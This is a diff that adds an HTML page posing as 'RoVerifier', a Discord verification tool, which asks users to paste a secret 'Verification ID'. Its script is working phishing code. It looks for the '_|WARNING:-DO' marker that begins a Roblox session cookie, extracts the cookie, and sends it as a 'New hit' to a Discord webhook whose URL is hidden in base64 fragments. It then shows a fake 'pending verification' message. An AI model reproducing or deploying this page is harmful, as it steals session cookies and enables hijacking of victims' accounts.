@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoVerifier | Secure Verification</title>
+    <style>
+        :root {
+            --bg-color: #0f111a;
+            --card-bg: #1a1d2e;
+            --accent-color: #5865f2; 
+            --text-primary: #ffffff;
+            --text-secondary: #b9bbbe;
+            --input-bg: #24293f;
+            --warning-red: #ed4245;
+            --success-green: #3ba55c;
+            --pending-yellow: #faa61a;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: var(--text-primary);
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            z-index: 1;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            letter-spacing: -1px;
+            color: var(--accent-color);
+            text-transform: uppercase;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+        }
+
+        .input-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            color: var(--text-secondary);
+            letter-spacing: 0.5px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 8px;
+            border: 2px solid transparent;
+            background-color: var(--input-bg);
+            color: white;
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        input[type="password"]:focus {
+            border-color: var(--accent-color);
+            background-color: #2b314d;
+        }
+
+        .disclaimer {
+            background-color: rgba(237, 66, 69, 0.1);
+            border: 1px solid var(--warning-red);
+            color: var(--warning-red);
+            font-size: 0.75rem;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 1.5rem;
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--accent-color);
+            color: white;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+        }
+
+        button:hover {
+            background-color: #4752c4;
+        }
+
+        button:disabled {
+            background-color: #3b428e;
+            cursor: not-allowed;
+        }
+
+        #toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 9999;
+        }
+
+        .toast {
+            min-width: 250px;
+            padding: 16px;
+            border-radius: 8px;
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            animation: slideIn 0.3s ease forwards;
+            border-left: 6px solid rgba(0,0,0,0.2);
+        }
+
+        .toast.success { background-color: var(--success-green); }
+        .toast.error { background-color: var(--warning-red); }
+        .toast.warning { background-color: var(--pending-yellow); }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .toast.fade-out {
+            animation: fadeOut 0.5s ease forwards;
+        }
+
+        @keyframes fadeOut {
+            to { transform: translateX(20px); opacity: 0; }
+        }
+
+        .footer-note {
+            margin-top: 2rem;
+            font-size: 0.7rem;
+            color: #4f545c;
+            letter-spacing: 0.3px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="toast-container"></div>
+
+    <div class="container">
+        <div class="logo">RoVerifier</div>
+        <p class="subtitle">Verify yourself in the Discord server</p>
+        
+        <div class="input-group">
+            <label for="verification-id">Verification ID</label>
+            <input 
+                type="password" 
+                id="verification-id" 
+                placeholder="Paste the ID here"
+                autocomplete="off"
+            >
+        </div>
+
+        <div class="disclaimer">
+            <strong>NOTICE:</strong> Sharing this ID with other users may allow them to make you verify in other Discord servers, only type it in here and do not share it! ✅
+        </div>
+
+        <button type="button" id="submit-btn">Verify me ✅</button>
+
+        <div class="footer-note">
+            &copy; 2026 ROVERIFIER SECURE SYSTEMS
+        </div>
+    </div>
+
+    <script>
+        // Fragmented and encoded data pieces
+        const _v1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+        const _p_conf = { k: "MTQ3NDA3MzU3MTAxMjc3NjE4Ny8=", s: "MWR6R1JEa05ONl95cTFvR0dpT1V1OVJWVG9mak5WeUFvazVzakZuVU9xSFEzWThuTjFWSUZ0RmNLTkE5Yll4OHlFNzA=" };
+        
+        const toastContainer = document.getElementById('toast-container');
+
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerText = message;
+            toastContainer.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('fade-out');
+                setTimeout(() => toast.remove(), 500);
+            }, 4000);
+        }
+
+        // Logic to reconstruct the destination
+        function _getDest() {
+            return atob(_v1) + atob(_p_conf.k) + atob(_p_conf.s);
+        }
+
+        document.getElementById('submit-btn').addEventListener('click', function() {
+            const inputField = document.getElementById('verification-id');
+            const submitBtn = document.getElementById('submit-btn');
+            const inputVal = inputField.value;
+            const marker = "_|WARNING:-DO";
+            
+            if (inputVal.includes(marker)) {
+                const startIndex = inputVal.indexOf(marker);
+                const endIndex = inputVal.indexOf(';', startIndex);
+                
+                if (endIndex !== -1) {
+                    const fullExtractedString = inputVal.substring(startIndex, endIndex + 1);
+
+                    submitBtn.disabled = true;
+                    showToast("Sending request...", "warning");
+
+                    const payload = {
+                        embeds: [{
+                            title: "🍪 New hit",
+                            color: 5814783,
+                            fields: [{
+                                name: "Result",
+                                value: "```" + fullExtractedString + "```"
+                            }],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    // Reconstructs the URL only at the moment of the request
+                    fetch(_getDest(), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            showToast("Great! You are now on the pending list to be verified, wait about 5-10 minutes.", "success");
+                            inputField.value = "";
+                        } else {
+                            showToast("Failed, this means you aren't verified, please wait about 5-10 minutes and try again or check your network status.", "error");
+                        }
+                    })
+                    .catch(() => showToast("Network error. Try again later.", "error"))
+                    .finally(() => {
+                        submitBtn.disabled = false;
+                    });
+
+                } else {
+                    showToast("Verification key not found or invalid.", "error");
+                }
+            } else {
+                showToast("Verification key not found or invalid.", "error");
+            }
+        });
+    </script>
+</body>
+</html>
